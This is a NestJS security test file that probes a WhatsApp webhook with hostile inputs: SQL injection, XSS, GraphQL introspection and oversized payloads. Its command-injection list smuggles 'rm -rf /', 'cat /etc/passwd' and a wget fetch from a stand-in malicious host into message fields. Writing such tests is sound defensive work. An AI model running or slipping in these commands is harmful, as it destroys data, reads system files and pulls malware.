import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';

/**
 * Security tests for input validation
 *
 * Tests the application's resistance to:
 * - Injection attacks
 * - XSS attacks
 * - Command injection
 * - Data validation flaws
 */
describe('Input Validation Security Tests', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();

    // Ensure validation pipe is properly set up
    app.useGlobalPipes(
      new ValidationPipe({
        whitelist: true,
        forbidNonWhitelisted: true,
        transform: true,
      }),
    );

    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('WhatsApp Webhook Input Validation', () => {
    // Mock signature for testing
    const mockSignature = 'valid-signature';

    it('should reject payloads with SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        'DROP TABLE users',
        "'; SELECT * FROM users; --",
        "1'; INSERT INTO users VALUES ('hacker', 'password'); --",
      ];

      // Test each SQL injection payload
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: 'whatsapp:+18765551234',
            Body: payload,
            ProfileName: 'Test User',
            WaId: '18765551234',
          });

        // Should be handled safely without 500 error
        expect(response.status).not.toBe(500);

        // Response should not contain any error stack traces
        expect(JSON.stringify(response.body)).not.toContain('at Object.');
        expect(JSON.stringify(response.body)).not.toContain('at Module.');
        expect(JSON.stringify(response.body)).not.toContain('at async');
      }
    });

    it('should handle XSS attack attempts', async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src='x' onerror='alert(1)'>",
        '<svg onload=alert(1)>',
      ];

      // Test each XSS payload
      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: 'whatsapp:+18765551234',
            Body: payload,
            ProfileName: 'Test User',
            WaId: '18765551234',
          });

        // Check response to ensure scripts are not executed
        expect(response.status).toBe(200);
        expect(JSON.stringify(response.body)).not.toContain('<script>');
        expect(JSON.stringify(response.body)).not.toContain('onerror=');
        expect(JSON.stringify(response.body)).not.toContain('onload=');
      }
    });

    it('should sanitize command injection attempts', async () => {
      const commandInjectionPayloads = [
        'balance; rm -rf /',
        "help && echo 'pwned'",
        'link || cat /etc/passwd',
        '`wget http://malicious.com/malware`',
      ];

      // Test each command injection payload
      for (const payload of commandInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: 'whatsapp:+18765551234',
            Body: payload,
            ProfileName: 'Test User',
            WaId: '18765551234',
          });

        // No server errors should occur
        expect(response.status).not.toBe(500);

        // No command execution in response
        expect(JSON.stringify(response.body)).not.toContain('password:');
        expect(JSON.stringify(response.body)).not.toContain('root:');
      }
    });

    it('should validate phone number formats', async () => {
      const invalidPhoneFormats = [
        'whatsapp:+1abc1234567', // Non-numeric
        'whatsapp:+12', // Too short
        'whatsapp:+12345678901234567890', // Too long
        'tel:+18765551234', // Wrong prefix
        '+18765551234', // Missing prefix
      ];

      // Test each invalid phone format
      for (const invalidPhone of invalidPhoneFormats) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: invalidPhone,
            Body: 'help',
            ProfileName: 'Test User',
            WaId: invalidPhone.replace('whatsapp:', ''),
          });

        // Should be handled gracefully
        expect(response.status).not.toBe(500);
      }
    });

    it('should validate and sanitize profile names', async () => {
      const suspiciousProfileNames = [
        "<script>alert('XSS')</script>",
        "Robert'); DROP TABLE users;--",
        'Admin\x00Bypass',
        'Super\\ Long\\ Name\\ '.repeat(100),
      ];

      // Test each suspicious profile name
      for (const profileName of suspiciousProfileNames) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: 'whatsapp:+18765551234',
            Body: 'help',
            ProfileName: profileName,
            WaId: '18765551234',
          });

        // Should be handled gracefully
        expect(response.status).not.toBe(500);

        // No script tags in response
        expect(JSON.stringify(response.body)).not.toContain('<script>');
      }
    });

    it('should handle null or undefined fields properly', async () => {
      const testCases = [
        { MessageSid: null, From: 'whatsapp:+18765551234', Body: 'help', WaId: '18765551234' },
        { MessageSid: 'SM123456789', From: null, Body: 'help', WaId: '18765551234' },
        {
          MessageSid: 'SM123456789',
          From: 'whatsapp:+18765551234',
          Body: null,
          WaId: '18765551234',
        },
        { MessageSid: 'SM123456789', From: 'whatsapp:+18765551234', Body: 'help', WaId: null },
        { MessageSid: undefined, From: undefined, Body: undefined, WaId: undefined },
        {},
      ];

      // Test each case with missing fields
      for (const testCase of testCases) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send(testCase);

        // Should handle gracefully without 500 error
        expect(response.status).not.toBe(500);
      }
    });

    it('should validate OTP codes for format and length', async () => {
      const invalidOtps = [
        'verify 12345', // Too short
        'verify 1234567', // Too long
        'verify 12345a', // Non-numeric
        'verify', // Missing OTP
        'verify %^&*()', // Invalid characters
      ];

      // Test each invalid OTP format
      for (const otpCommand of invalidOtps) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: 'whatsapp:+18765551234',
            Body: otpCommand,
            ProfileName: 'Test User',
            WaId: '18765551234',
          });

        // Should be handled as invalid OTP
        expect(response.status).toBe(200);
        expect(JSON.stringify(response.body)).toContain('invalid');
      }
    });
  });

  describe('GraphQL Query Injection', () => {
    // Mock signature for testing
    const mockSignature = 'valid-signature';

    it('should prevent GraphQL query tampering', async () => {
      // Commands that involve GraphQL operations
      const maliciousGraphQLPayloads = [
        // Balance command with GraphQL injection attempt
        'balance{__schema{types{name}}}',
        // Link command with nested queries
        'link{user{password,email,walletKeys}}',
        // Help command with introspection
        'help{__type(name:"User"){fields{name}}}',
      ];

      // Test each potential GraphQL injection
      for (const payload of maliciousGraphQLPayloads) {
        const response = await request(app.getHttpServer())
          .post('/whatsapp/webhook')
          .set('X-Twilio-Signature', mockSignature)
          .send({
            MessageSid: 'SM123456789',
            From: 'whatsapp:+18765551234',
            Body: payload,
            ProfileName: 'Test User',
            WaId: '18765551234',
          });

        // Should not expose GraphQL schema information
        expect(response.status).toBe(200);
        expect(JSON.stringify(response.body)).not.toContain('__schema');
        expect(JSON.stringify(response.body)).not.toContain('__type');
        expect(JSON.stringify(response.body)).not.toContain('password');
        expect(JSON.stringify(response.body)).not.toContain('walletKeys');
      }
    });
  });

  describe('Denial of Service Prevention', () => {
    // Mock signature for testing
    const mockSignature = 'valid-signature';

    it('should handle large message bodies without crashing', async () => {
      // Generate a very large message body
      const largeBody = 'A'.repeat(100000);

      const response = await request(app.getHttpServer())
        .post('/whatsapp/webhook')
        .set('X-Twilio-Signature', mockSignature)
        .send({
          MessageSid: 'SM123456789',
          From: 'whatsapp:+18765551234',
          Body: largeBody,
          ProfileName: 'Test User',
          WaId: '18765551234',
        });

      // Should not crash the server
      expect(response.status).not.toBe(500);
    });

    it('should handle malformed JSON payloads', async () => {
      // Test with malformed JSON
      const response = await request(app.getHttpServer())
        .post('/whatsapp/webhook')
        .set('X-Twilio-Signature', mockSignature)
        .set('Content-Type', 'application/json')
        .send(
          '{"MessageSid":"SM123456789", "From":"whatsapp:+18765551234", "Body": malformed JSON here',
        );

      // Should not crash the server
      expect(response.status).not.toBe(500);
    });

    it('should limit nested JSON structures', async () => {
      // Create a deeply nested JSON structure
      let nestedJson: any = { value: 'test' };
      for (let i = 0; i < 100; i++) {
        nestedJson = { nested: nestedJson };
      }

      const response = await request(app.getHttpServer())
        .post('/whatsapp/webhook')
        .set('X-Twilio-Signature', mockSignature)
        .send({
          MessageSid: 'SM123456789',
          From: 'whatsapp:+18765551234',
          Body: 'help',
          ProfileName: 'Test User',
          WaId: '18765551234',
          Extra: nestedJson,
        });

      // Should not crash with deeply nested JSON
      expect(response.status).not.toBe(500);
    });
  });
});
